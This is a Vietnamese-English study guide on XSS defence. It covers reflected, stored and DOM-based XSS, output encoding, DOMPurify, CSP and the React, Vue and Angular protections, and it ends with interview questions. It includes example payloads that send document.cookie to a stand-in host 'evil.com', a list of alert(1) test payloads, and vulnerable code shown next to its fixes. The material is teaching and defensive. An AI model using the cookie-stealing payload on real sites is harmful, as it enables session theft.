# XSS Prevention - Cross-Site Scripting Defense

> XSS là một trong những vulnerabilities phổ biến nhất. Hiểu các loại XSS và cách phòng chống là essential.

---

## 🎯 Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    XSS ATTACK TYPES                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│   REFLECTED XSS                                                  │
│   ┌─────────────────────────────────────────────────┐            │
│   │ Attacker ──▶ Victim clicks malicious link       │            │
│   │              URL: site.com?q=<script>...</script>│            │
│   │ Server reflects payload in response             │            │
│   │ Script executes in victim's browser             │            │
│   └─────────────────────────────────────────────────┘            │
│                                                                   │
│   STORED XSS                                                     │
│   ┌─────────────────────────────────────────────────┐            │
│   │ Attacker posts malicious script to site         │            │
│   │ (comment, profile, message)                     │            │
│   │ Script stored in database                       │            │
│   │ ALL users who view content get attacked         │            │
│   └─────────────────────────────────────────────────┘            │
│                                                                   │
│   DOM-BASED XSS                                                  │
│   ┌─────────────────────────────────────────────────┐            │
│   │ Payload never sent to server                    │            │
│   │ JavaScript reads untrusted data                 │            │
│   │ Writes to DOM unsafely                          │            │
│   │ Client-side only attack                         │            │
│   └─────────────────────────────────────────────────┘            │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔴 Reflected XSS

### How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    REFLECTED XSS FLOW                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│   1. Attacker crafts malicious URL:                              │
│      https://shop.com/search?q=<script>                          │
│      document.location='evil.com?c='+document.cookie             │
│      </script>                                                   │
│                                                                   │
│   2. Attacker sends link to victim (email, message)              │
│                                                                   │
│   3. Victim clicks link                                          │
│                                                                   │
│   4. Server responds with:                                       │
│      <p>Search results for: <script>...</script></p>            │
│                                                                   │
│   5. Victim's browser executes script                            │
│      → Cookies sent to attacker!                                 │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Example Attack

```javascript
// Vulnerable code on server
app.get('/search', (req, res) => {
    const query = req.query.q;
    // ❌ DANGEROUS: Reflects user input without encoding
    res.send(`<h1>Results for: ${query}</h1>`);
});

// Malicious URL:
// /search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

// Fix: Encode output
const escapeHtml = (str) => {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

app.get('/search', (req, res) => {
    const query = escapeHtml(req.query.q);
    res.send(`<h1>Results for: ${query}</h1>`);
});
```

---

## 🔴 Stored XSS

### How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    STORED XSS FLOW                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│   1. Attacker posts malicious content:                           │
│      Comment: "Nice post! <script>...</script>"                  │
│                                                                   │
│   2. Server stores in database                                   │
│                                                                   │
│   3. Other users view the page                                   │
│                                                                   │
│   4. Server loads comment from database                          │
│      renders: "Nice post! <script>...</script>"                  │
│                                                                   │
│   5. EVERY user's browser executes the script                    │
│      → Massive impact!                                           │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Example Attack

```javascript
// ❌ Vulnerable: Storing and displaying without sanitization
// User submits comment
const comment = req.body.comment;
await db.comments.insert({ text: comment }); // Stored as-is

// Later, displaying comments
const comments = await db.comments.findAll();
res.render('post', { comments }); // Rendered without escaping

// Template (EJS):
<% comments.forEach(c => { %>
    <div><%- c.text %></div>  // <%- is UNESCAPED!
<% }) %>

// ✅ Fixed: Sanitize input AND escape output
const DOMPurify = require('isomorphic-dompurify');

// On input
const sanitizedComment = DOMPurify.sanitize(req.body.comment);
await db.comments.insert({ text: sanitizedComment });

// Template (use escaped output)
<% comments.forEach(c => { %>
    <div><%= c.text %></div>  // <%= is escaped
<% }) %>
```

---

## 🔴 DOM-Based XSS

### How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    DOM-BASED XSS FLOW                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│   1. Attacker crafts URL:                                        │
│      https://site.com/page#<img src=x onerror=alert(1)>         │
│                                                                   │
│   2. Victim visits URL                                           │
│                                                                   │
│   3. Client-side JavaScript reads location.hash                  │
│      document.getElementById('output').innerHTML = location.hash │
│                                                                   │
│   4. Script executes in victim's browser                         │
│      (Server never sees the payload!)                            │
│                                                                   │
│   KEY: Payload stays client-side, never reaches server           │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Vulnerable Patterns

```javascript
// ❌ DANGEROUS: Direct DOM manipulation with user input

// Reading from URL
const userInput = window.location.hash.slice(1);
document.getElementById('output').innerHTML = userInput;

// Reading from localStorage
const savedData = localStorage.getItem('userData');
element.innerHTML = savedData;

// Using document.write
document.write(location.search);

// Setting href
element.href = userInput; // javascript:alert(1)

// Setting event handlers
element.onclick = new Function(userInput);
element.setAttribute('onclick', userInput);

// eval and similar
eval(userInput);
setTimeout(userInput, 1000);
setInterval(userInput, 1000);
new Function(userInput)();
```

### Safe Alternatives

```javascript
// ✅ SAFE: Use textContent instead of innerHTML
document.getElementById('output').textContent = userInput;

// ✅ SAFE: Create elements programmatically
const div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);

// ✅ SAFE: Validate URLs
function safeSetHref(element, url) {
    try {
        const parsed = new URL(url, window.location.origin);
        // Only allow http and https
        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
            element.href = parsed.href;
        }
    } catch (e) {
        console.error('Invalid URL');
    }
}

// ✅ SAFE: Use data attributes for passing data
<div data-user-id="123" data-user-name="John"></div>
const userId = element.dataset.userId; // "123"
```

---

## 🛡️ Prevention Strategies

### 1. Output Encoding

```javascript
// Context-specific encoding

// HTML Context
const htmlEncode = (str) => {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
};

// JavaScript Context
const jsEncode = (str) => {
    return JSON.stringify(str); // Handles escaping
};

// URL Context
const urlEncode = (str) => {
    return encodeURIComponent(str);
};

// CSS Context
const cssEncode = (str) => {
    return str.replace(/[^a-zA-Z0-9]/g, (char) => {
        return '\\' + char.charCodeAt(0).toString(16) + ' ';
    });
};

// Usage
const template = `
    <div class="${cssEncode(userClass)}">
        ${htmlEncode(userContent)}
        <a href="/search?q=${urlEncode(userQuery)}">Search</a>
        <script>
            const data = ${jsEncode(userData)};
        </script>
    </div>
`;
```

### 2. Input Sanitization

```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const clean = DOMPurify.sanitize(dirty);

// Allow only specific tags
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title']
});

// Forbid specific tags
const clean = DOMPurify.sanitize(dirty, {
    FORBID_TAGS: ['script', 'style', 'iframe'],
    FORBID_ATTR: ['onclick', 'onerror']
});

// Return safe DOM node (not string)
const cleanNode = DOMPurify.sanitize(dirty, {
    RETURN_DOM: true
});

// Strip all HTML (plain text only)
const textOnly = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [] // No tags allowed
});
```

### 3. Content Security Policy

```javascript
// HTTP Header
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;

// In HTML
<script nonce="abc123">
    // This will execute because nonce matches
    console.log('Safe script');
</script>

<script>
    // This will be BLOCKED - no nonce
    alert('XSS attempt');
</script>

// Generate nonce per request
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');
```

---

## ⚛️ Framework-Specific Protection

### React

```jsx
// ✅ SAFE: React auto-escapes by default
function Comment({ text }) {
    return <div>{text}</div>; // Auto-escaped
}

// ⚠️ DANGEROUS: dangerouslySetInnerHTML
function Comment({ htmlContent }) {
    // Only use with sanitized content!
    return (
        <div
            dangerouslySetInnerHTML={{
                __html: DOMPurify.sanitize(htmlContent)
            }}
        />
    );
}

// ⚠️ DANGEROUS: Dynamic href with javascript:
function Link({ url }) {
    // Validate URL first!
    const safeUrl = url.startsWith('javascript:') ? '#' : url;
    return <a href={safeUrl}>Click</a>;
}

// ✅ SAFE: Use URL validation
function SafeLink({ url }) {
    const isValidUrl = useMemo(() => {
        try {
            const parsed = new URL(url);
            return ['http:', 'https:'].includes(parsed.protocol);
        } catch {
            return false;
        }
    }, [url]);

    if (!isValidUrl) return null;
    return <a href={url}>Click</a>;
}
```

### Vue

```vue
<!-- ✅ SAFE: Vue auto-escapes -->
<template>
    <div>{{ userInput }}</div>
</template>

<!-- ⚠️ DANGEROUS: v-html -->
<template>
    <div v-html="sanitizedHtml"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
    computed: {
        sanitizedHtml() {
            return DOMPurify.sanitize(this.rawHtml);
        }
    }
}
</script>

<!-- ⚠️ DANGEROUS: Dynamic attributes -->
<template>
    <!-- Validate before binding -->
    <a :href="safeUrl">Link</a>
</template>
```

### Angular

```typescript
// Angular sanitizes by default

// Safe by default
@Component({
    template: `<div>{{ userInput }}</div>`
})

// Bypass sanitization (dangerous!)
import { DomSanitizer } from '@angular/platform-browser';

@Component({
    template: `<div [innerHTML]="trustedHtml"></div>`
})
export class MyComponent {
    constructor(private sanitizer: DomSanitizer) {}

    get trustedHtml() {
        // Still sanitize first!
        const clean = DOMPurify.sanitize(this.rawHtml);
        return this.sanitizer.bypassSecurityTrustHtml(clean);
    }
}
```

---

## 🧪 Testing for XSS

### Common Payloads

```javascript
// Basic payloads to test
const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
];

// Event handlers to check
const eventHandlers = [
    'onload', 'onerror', 'onclick', 'onmouseover',
    'onfocus', 'onblur', 'oninput', 'onchange',
    'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress'
];
```

### Automated Testing

```javascript
// Using OWASP ZAP or similar tools
// Or write custom tests

describe('XSS Prevention', () => {
    const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>'
    ];

    xssPayloads.forEach(payload => {
        it(`should sanitize: ${payload.slice(0, 20)}...`, () => {
            const sanitized = DOMPurify.sanitize(payload);
            expect(sanitized).not.toContain('<script');
            expect(sanitized).not.toContain('onerror');
        });
    });
});
```

---

## ❓ Câu Hỏi Phỏng Vấn

### 🟢 Junior

**Q: What is XSS?**

A: Cross-Site Scripting - attack where malicious scripts are injected into trusted websites. Attacker's code runs in victim's browser, can steal cookies, session tokens, or perform actions as the user.

**Q: How does React prevent XSS?**

A: React automatically escapes values in JSX before rendering. When you write `{userInput}`, React converts special characters to HTML entities. Exception: `dangerouslySetInnerHTML` bypasses this protection.

### 🟡 Mid-level

**Q: Difference between Reflected and Stored XSS?**

A:
- **Reflected**: Payload comes from current request (URL, form input). Server reflects it in response. One-time attack per victim.
- **Stored**: Payload stored in database. Affects all users who view the content. More dangerous - persistent attack.

**Q: What is DOM-based XSS?**

A: Client-side XSS where payload never reaches server. JavaScript reads untrusted data (URL hash, localStorage) and writes to DOM unsafely. Harder to detect because server logs don't show the attack.

### 🔴 Senior

**Q: Design XSS prevention strategy for rich-text editor**

A:
```
1. Input Phase:
   - Use allowlist of permitted HTML tags/attributes
   - Sanitize with DOMPurify on client AND server
   - Strip dangerous attributes (onclick, onerror)

2. Storage:
   - Store sanitized HTML
   - Consider storing raw + sanitized versions

3. Output Phase:
   - Re-sanitize before rendering (defense in depth)
   - Use CSP to block inline scripts
   - Implement nonce for allowed scripts

4. Content Security Policy:
   - script-src 'nonce-xyz' (no unsafe-inline)
   - Strict CSP to catch bypasses

5. Monitoring:
   - CSP reporting to detect attacks
   - Log sanitization events
```

---

## 📚 Active Recall

1. [ ] 3 types of XSS và differences
2. [ ] Dangerous DOM methods (innerHTML, etc.)
3. [ ] How React/Vue/Angular handle XSS
4. [ ] DOMPurify configuration options
5. [ ] Testing payloads for XSS

---

> **Tiếp theo:** [02-csrf-protection.md](./02-csrf-protection.md) - CSRF Protection
